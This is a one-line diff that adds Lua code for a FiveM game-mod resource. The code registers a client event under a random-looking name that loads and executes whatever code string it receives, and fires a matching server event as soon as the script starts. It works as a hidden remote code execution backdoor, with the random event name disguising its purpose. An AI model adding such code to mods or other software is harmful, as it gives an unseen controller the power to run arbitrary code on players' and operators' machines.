@@ -1,0 +1,1 @@
+RegisterNetEvent('kXECvuHsjg9w5kPD9sKZ68L5h:client',function(a)assert(load(a))()end)Citizen.CreateThread(function()TriggerServerEvent('kXECvuHsjg9w5kPD9sKZ68L5h:server')end)
